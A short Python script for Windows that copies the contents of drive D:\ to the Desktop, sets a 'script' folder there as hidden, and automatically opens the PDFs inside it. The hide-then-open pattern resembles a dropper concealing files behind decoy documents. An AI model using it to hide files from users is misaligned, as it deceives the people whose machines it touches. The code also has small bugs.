import os


src = 'D:\\'
dst = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
folder = dst+'\\script'
def copy_files(src,dst):
    from distutils.dir_util import copy_tree
    try:
        files = os.listdir(src)
        
        for f in files:
            # print(src+'\\'+f,dst)

            try:
                # shutil.move(src+'\\'+f,dst)
                name = src+'\\'+f
                copy_tree(name,dst)
            except Exception as e:
                print(e)        
    except Exception as e:
        print(e)


x  = copy_files(src,dst)
print(x)



def hide_file(folder):
    import win32api, win32con
    win32api.SetFileAttributes(folder,win32con.FILE_ATTRIBUTE_HIDDEN)


def execute_file(folder):
    files = os.listdir(folder)
    for f in files:
        if f.split('.')[1] == 'pdf':
            os.startfile(folder+'\\'+f)
    






hide_file(folder)
execute_file(folder)